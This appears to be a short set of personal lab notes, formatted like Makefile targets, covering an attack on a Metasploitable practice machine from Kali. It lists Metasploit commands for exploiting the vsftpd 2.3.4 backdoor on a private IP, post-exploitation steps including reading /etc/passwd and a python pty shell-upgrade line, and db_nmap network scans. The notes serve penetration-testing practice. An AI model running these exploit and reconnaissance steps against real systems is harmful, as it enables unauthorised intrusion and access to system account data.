l2:
	/usr/share/kali-menu/helper-scripts/metasploit-framework.sh
	sudo netdiscover
	search vsftpd 2.3.4
	use 0
	show options
	set RHOSTS 192.168.0.104
	exploit
l2metasploitable:
	whoami
	root
	ip address
	cat /etc/passwd
	su msfadmin
	python -c ‘import pty; pty.spawn(“bin/sh”)’
	exit
l2ifdocker:
	find / -type f -name 'msfconsole' 2>/dev/null | sed -n '1,200p'
	/usr/src/metasploit-framework/msfconsole
	db_connect postgresql://msf:msf@postgres:5432/msf_database
	db_nmap -p 22,80,443 192.168.0.0/24
	db_nmap -p 21,22,80,443 192.168.0.107
	find / -type f -name 'netdiscover' 2>/dev/null | sed -n '1,200p'